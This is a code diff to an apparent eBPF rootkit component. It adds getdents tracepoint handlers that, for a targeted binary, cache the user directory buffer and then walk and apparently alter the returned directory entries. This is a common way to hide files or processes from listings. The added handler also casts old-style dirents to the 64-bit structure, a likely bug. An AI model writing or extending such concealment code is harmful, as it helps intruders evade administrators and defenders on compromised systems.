@@ -109,7 +109,7 @@ static long __process_dirent_entry(__u32 index, void *data)
 }
 
 /**
- * Capture __x64_sys_getdents context using kprobe.
+ * Capture __x64_sys_getdents64 context using kprobe.
  */
 SEC("tp/syscalls/sys_enter_getdents64")
 int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx)
@@ -126,9 +126,27 @@ int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx)
     return 0;
 }
 
+/**
+ * Capture __x64_sys_getdents context using kprobe.
+ */
+SEC("tp/syscalls/sys_enter_getdents")
+int tp_sys_enter_getdents(struct sys_getdents_enter_ctx *ctx)
+{
+    if(!__is_target_bin())
+        return 0;
+
+    __u64 dirp = (__u64)ctx->dirent;
+    __u64 key  = bpf_get_current_pid_tgid(); //64 bits value returned.
+
+    bpf_map_update_elem(&getdents_cache, &key, &dirp, BPF_ANY);
+    PRINT_DEBUG("Event ! Saving __user dirent64 addr in cache for dirp : 0x%llx & key : %lld", (unsigned long long)dirp, (unsigned long long)key);
+
+    return 0;
+}
+
 
 /**
- * Handle return from __x64_sys_getdents & manip.
+ * Handle return from __x64_sys_getdents64 & manip.
  */
 SEC("tp/syscalls/sys_exit_getdents64")
 int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
@@ -167,6 +185,48 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
 
     return ret;
 }
+
+/**
+ * Handle return from __x64_sys_getdents & manip.
+ */
+SEC("tp/syscalls/sys_exit_getdents")
+int tp_sys_exit_getdents(struct sys_getdents_exit_ctx *ctx)
+{
+    long ret = ctx->ret;
+
+    if(ret <= 0)
+        return ret;
+
+    if(!__is_target_bin())
+        return ret;
+
+    //get from cache.
+    __u64 key  = bpf_get_current_pid_tgid();
+
+    __u64 *cache_val = bpf_map_lookup_elem(&getdents_cache, &key);
+    if(!cache_val)
+        return ret;
+    
+    PRINT_DEBUG("Cache triggered ! tp/syscalls/sys_exit_getdents64. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);
+
+    struct linux_dirent64 *dirp = (struct linux_dirent64*)(*cache_val);
+
+    //del entry cached.
+    bpf_map_delete_elem(&getdents_cache, &key);
+
+    //preparing bpf_loop ctx.
+    struct getdents_loop_ctx lctx = {
+        .dirp        = dirp,
+        .last        = NULL,
+        .curr_offset = 0,
+        .ret         = ret
+    };
+
+    long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);
+
+    return ret;
+}
+
 
 //-----------------------------------------------------
 
